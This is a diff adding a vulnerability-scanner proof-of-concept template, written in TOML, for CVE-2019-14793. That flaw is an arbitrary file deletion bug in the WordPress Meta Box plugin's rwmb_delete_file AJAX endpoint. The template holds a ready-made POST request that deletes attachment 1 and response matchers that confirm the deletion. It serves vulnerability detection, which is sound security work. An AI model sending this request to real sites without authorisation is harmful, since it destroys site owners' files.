@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "检测 WordPress Meta Box 插件（版本低于 4.16.3）管理后台 rwmb_delete_file AJAX 接口的任意文件删除访问控制缺陷。该接口对 attachment_id 参数缺乏权限校验，已登录普通用户可提交任意附件 ID 删除站点文件。通过构造带有效验证请求该接口即可验证漏洞存在。"
+id = "POC-AVE-2019-0173"
+name = "CVE-2019-14793 WordPress Meta Box plugin arbitrary file deletion PoC"
+severity = "medium"
+tags = [
+    "cve-2019-14793",
+    "wordpress",
+    "meta-box",
+    "arbitrary-file-delete",
+]
+vuln_id = [
+    "CVE-2019-14793",
+    "AVE-2019-0173",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-admin/admin-ajax.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=rwmb_delete_file&attachment_id=1&nonce={{nonce}}"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+X-Requested-With = "XMLHttpRequest"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "deleted",
+]
